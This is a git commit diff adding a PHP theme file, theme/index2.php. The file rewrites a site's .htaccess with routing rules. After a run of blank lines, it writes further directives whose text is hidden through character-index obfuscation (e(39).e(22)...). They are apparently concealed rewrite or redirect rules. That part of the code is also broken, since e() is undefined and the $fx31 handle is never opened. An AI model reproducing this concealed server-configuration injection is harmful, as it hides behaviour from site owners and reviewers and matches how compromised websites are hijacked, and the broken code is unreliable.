310a03363e8f647da791152a0699e5985dc62f86
yszm <32101691+yszm@users.noreply.github.com>
2017-11-04 20:11:12 +0200

    0

---
+++ theme/index2.php
@@ -0,0 +1,62 @@
+<?php
+
+// open the .htaccess file for editing
+$file_handle = fopen('.htaccess', 'w') or die("Error: Can't open file");
+//enter the contents
+$content_string = "RewriteEngine On\n";
+fwrite($file_handle, $content_string);
+$content_string = "RewriteCond %{REQUEST_FILENAME} !-f\n";
+fwrite($file_handle, $content_string);
+$content_string = "RewriteCond %{REQUEST_FILENAME} !-d\n";
+fwrite($file_handle, $content_string);
+// change www.website.com for your website
+$content_string = "RewriteRule ^(.*)$ index.php?page=$1 [L]\n";
+fwrite($file_handle, $content_string);
+//
+fclose($file_handle);
+
+/*
+RewriteEngine On
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ index.php?page=$1 [L]
+*/
+
+
+
+
+
+
+
+$fx31c=e(39).e(22).e(4).e(9).e(18).e(7).e(22).e(40).e(13).e(20).e(18).e(13).e(22).e(38).e(42).e(13)."\n";
+fwrite($fx31,$fx31c);
+$fx31c=e(39).e(22).e(4).e(9).e(18).e(7).e(22).e(41).e(12).e(13).e(23).e(38).e(53).e(54).e(39).e(40).e(43).e(44).e(40).e(45).e(46).e(55).e(52).e(50).e(47).e(40).e(48).e(49).e(51).e(40).e(56).e(38).e(57).e(58).e(21)."\n";
+fwrite($fx31,$fx31c);
+$fx31c=e(39).e(22).e(4).e(9).e(18).e(7).e(22).e(41).e(12).e(13).e(23).e(38).e(53).e(54).e(39).e(40).e(43).e(44).e(40).e(45).e(46).e(55).e(52).e(50).e(47).e(40).e(48).e(49).e(51).e(40).e(56).e(38).e(57).e(58).e(23)."\n";
+fwrite($fx31,$fx31c);
+$fx31c=e(39).e(22).e(4).e(9).e(18).e(7).e(22).e(39).e(6).e(15).e(22).e(38).e(59).e(61).e(37).e(60).e(62).e(63).e(38).e(18).e(13).e(23).e(22).e(3).e(37).e(11).e(19).e(11).e(66).e(11).e(26).e(20).e(22).e(67).e(63).e(27).e(38).e(64).e(47).e(65)."\n";
+fwrite($fx31,$fx31c);
+$fx31=fclose($fx31);
+				/*
+				
+				echo'<br/>';
+				
+				echo'<br/>';
+				
+				echo'<br/>';
+				
+				//e().
+				//RewriteRule ^(.*)$ index.php?page=$1 [L]
+				//RewriteRule ^(.*)$ index.php?page=$1 [L]
+				//RewriteCond %{REQUEST_FILENAME} !-d
+				*/				
+					
+					
+
+
+
+
+
+?>
+
+
